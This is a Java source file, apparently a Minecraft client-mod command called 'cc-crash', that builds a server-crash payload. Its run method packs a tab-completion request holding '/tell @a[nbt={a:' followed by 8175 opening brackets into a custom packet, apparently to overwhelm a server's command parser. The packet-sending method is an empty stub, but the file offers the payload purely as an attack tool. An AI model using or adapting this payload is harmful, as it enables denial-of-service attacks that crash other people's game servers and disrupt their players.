import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.util.Identifier;
import io.netty.buffer.Unpooled;

public class CommandCompleteCrash {
    private String name;
    private String description;

    public CommandCompleteCrash() {
        this.name = "cc-crash";
        this.description = "Command Complete Crash.";
    }

    public void build(LiteralArgumentBuilder<Object> builder) {
        builder.executes(this::run);
    }

    private int run(CommandContext<Object> ctx) {
        sendPacket(createCustomPayloadPacket(buf -> {
            String payload = "/tell @a[nbt={a:" + "[".repeat(8175);
            buf.writeVarInt(0);
            buf.writeString(payload, 32767);
        }, new Identifier("minecraft", "command_completion")));
        return 1;
    }

    private void sendPacket(CustomPayloadC2SPacket packet) {
    }

    private CustomPayloadC2SPacket createCustomPayloadPacket(PacketConsumer consumer, Identifier id) {
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        consumer.accept(buf);
        return new CustomPayloadC2SPacket(id, buf);
    }

    @FunctionalInterface
    private interface PacketConsumer {
        void accept(PacketByteBuf buf);
    }
}
